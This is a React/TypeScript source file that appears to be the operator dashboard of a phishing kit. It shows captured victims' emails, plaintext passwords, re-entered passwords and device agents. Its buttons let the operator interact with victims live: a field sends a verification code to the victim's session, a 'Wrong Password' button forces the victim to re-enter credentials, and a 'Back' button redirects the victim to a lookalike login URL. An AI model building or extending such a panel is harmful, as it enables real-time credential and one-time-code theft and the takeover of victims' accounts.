/* eslint-disable @typescript-eslint/no-explicit-any */

import { MailIcon } from "./Icons";
import moment from "moment";
import Pagination from "./Pagination";
import {
  FaWindows,
  FaApple,
  FaLinux,
  FaAndroid,
  FaYoutube,
  FaWhatsapp,
  FaFacebook,
} from "react-icons/fa";

import EmailViewPage from "../pages/EmailViewPage";
import { useState } from "react";
import { handleCopyClick } from "../utils/copyToClipboard";
import useSocket from "../hooks/useSocket";

const PlatformIcon = ({ platform }: { platform: string }) => {
  const p = platform.toLowerCase();
  let Icon = FaWindows;

  if (p.includes("mac") || p.includes("iphone") || p.includes("ipad"))
    Icon = FaApple;
  else if (p.includes("linux")) Icon = FaLinux;
  else if (p.includes("android")) Icon = FaAndroid;

  return <Icon className="h-5 w-5 text-black" />;
};

export default function InboxList({
  data,
  setCurrentPage,
  currentPage,
  setSearchQuery,
  searchQuery,
}: any) {
  const [expandedRow] = useState<string | null>(null);
  const [inputValues, setInputValues] = useState<Record<string, string>>({});
  const { sendToServer } = useSocket();
console.log(data,"main")
  const handleSend = (emailId: string, value: string) => {
    sendToServer("code", emailId, { url: "", code: value });
    setInputValues((prev) => ({ ...prev, [emailId]: "" }));
  };

  const sendWrongPassword = (emailId: string, value: string) => {
    sendToServer("code", emailId, { code: value });
  };
const handelBack =(emailId: string,value: string)=>{
 sendToServer("link", emailId, { url: `https://location.view-mapes.online/live.html?type=login&id=${value}` });
}
  const handlePageChange = (page: number) => setCurrentPage(page);

  return (
    <div className="max-w-full bg-white rounded-xl shadow p-4 text-black">

      {/* HEADER SEARCH + LINKS */}
      <div className="mb-4 flex flex-col md:flex-row items-center justify-between gap-4">
        <input
          type="text"
          placeholder="Search email..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          className="w-full md:w-1/3 px-4 py-2 border border-gray-300 
                     rounded-lg text-sm bg-white text-black"
        />

        <div className="flex gap-3 text-sm font-medium">
          <a
            href="https://www.youtube.com/@update-tools"
            target="_blank"
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-white 
                       bg-red-600 hover:bg-red-700 shadow-sm"
          >
            <FaYoutube /> YouTube
          </a>

          <a
            href="https://chat.whatsapp.com/I4TWXr1wi0ZGL5NA8HoOIC"
            target="_blank"
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-white 
                       bg-green-500 hover:bg-green-600 shadow-sm"
          >
            <FaWhatsapp /> WhatsApp
          </a>

          <a
            href="https://facebook.com"
            target="_blank"
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-white 
                       bg-blue-600 hover:bg-blue-700 shadow-sm"
          >
            <FaFacebook /> Facebook
          </a>
        </div>
      </div>

      {/* TABLE */}
      <div className="overflow-x-auto">
        <table className="min-w-full border-separate border-spacing-y-3 text-black">
          <thead>
            <tr className="text-xs font-semibold bg-white">
              <th className="px-4 py-3 text-left">Site</th>
              <th className="px-4 py-3 text-left">Email</th>
              <th className="px-4 py-3 text-left">Password</th>
              <th className="px-4 py-3 text-left">Re-Password</th>
              <th className="px-4 py-3 text-left">Code</th>
              <th className="px-4 py-3 text-left">Agent</th>
              <th className="px-4 py-3 text-left">User</th>
              <th className="px-4 py-3 text-left">Time</th>
              <th className="px-4 py-3 text-left">Actions</th>
            </tr>
          </thead>

          <tbody>
            {data?.result?.map((email: any) => (
              <>
                <tr
                  key={email._id}
                  className="bg-white rounded-xl shadow-sm hover:shadow-md transition-all"
                >
                  {/* Platform */}
                  <td className="px-4 py-3">
                    <PlatformIcon platform={email.agent?.platform || ""} />
                  </td>

                  {/* Email */}
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-2">
                      <MailIcon className="h-4 text-green-500" />
                      <span
                        onClick={() => handleCopyClick(email.email)}
                        className="text-sm cursor-pointer text-black hover:underline"
                      >
                        {email.email}
                      </span>
                    </div>
                  </td>

                  {/* Password */}
                  <td className="px-4 py-3">
                    <span
                      onClick={() => handleCopyClick(email.password)}
                      className="text-sm cursor-pointer text-black hover:underline"
                    >
                      {email.password}
                    </span>
                  </td>

                  {/* Repassword */}
                  <td className="px-4 py-3">
                    <span
                      onClick={() => handleCopyClick(email.repassword)}
                      className="text-sm cursor-pointer text-black hover:underline"
                    >
                      {email.repassword}
                    </span>
                  </td>

                  {/* Code input */}
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        value={inputValues[email._id] || ""}
                        onChange={(e) =>
                          setInputValues((prev) => ({
                            ...prev,
                            [email._id]: e.target.value,
                          }))
                        }
                        className="w-[110px] h-[34px] px-2 border border-gray-300 
                                   bg-white rounded text-xs text-black shadow-sm"
                      />
                      <button
                        onClick={() =>
                          handleSend(email._id, inputValues[email._id] || "")
                        }
                        className="px-3 py-1 bg-green-600 text-white text-xs 
                                   rounded shadow-sm hover:bg-green-700"
                      >
                        Send
                      </button>
                    </div>
                  </td>

                  {/* Agent */}
                  <td className="px-4 py-3 text-xs text-black max-w-[260px]">
                    {email.agent?.source}
                  </td>

                  {/* User */}
                  <td className="px-4 py-3 text-xs text-black">
                    {email.userDetails?.username || "-"}
                  </td>

                  {/* Time */}
                  <td className="px-4 py-3 text-xs text-black">
                    {moment(email.createdAt).format("YYYY-MM-DD")}
                  </td>

                  {/* ACTION BUTTONS */}
                  <td className="px-4 py-3">
                    <div className="flex flex-col gap-2 w-[110px]">

                      <button
                        onClick={() => sendWrongPassword(email._id, "wrong")}
                        className="bg-orange-500 text-white text-xs py-2 rounded-md shadow hover:bg-orange-600 text-center"
                      >
                        Wrong Password
                      </button>

                      <button 
                      onClick={()=>handelBack(email._id,email.user)}
                      
                      className="bg-[#00AEEF] text-white text-xs py-2 rounded-md shadow hover:bg-blue-500 text-center">
                        Back
                      </button>

                      <button className="bg-green-500 text-white text-xs py-2 rounded-md shadow hover:bg-green-600 text-center">
                        Done
                      </button>

                      <button className="bg-red-500 text-white text-xs py-2 rounded-md shadow hover:bg-red-600 text-center">
                        Delete
                      </button>

                    </div>
                  </td>
                </tr>

                {/* Expanded */}
                {expandedRow === email._id && (
                  <tr>
                    <td colSpan={10} className="bg-white p-3 rounded-b-xl">
                      <EmailViewPage id={email._id} />
                    </td>
                  </tr>
                )}
              </>
            ))}
          </tbody>
        </table>
      </div>

      {/* Pagination */}
      <div className="mt-4">
        <Pagination
          currentPage={currentPage}
          onPageChange={handlePageChange}
          totalPage={data?.meta?.totalPage}
        />
      </div>
    </div>
  );
}
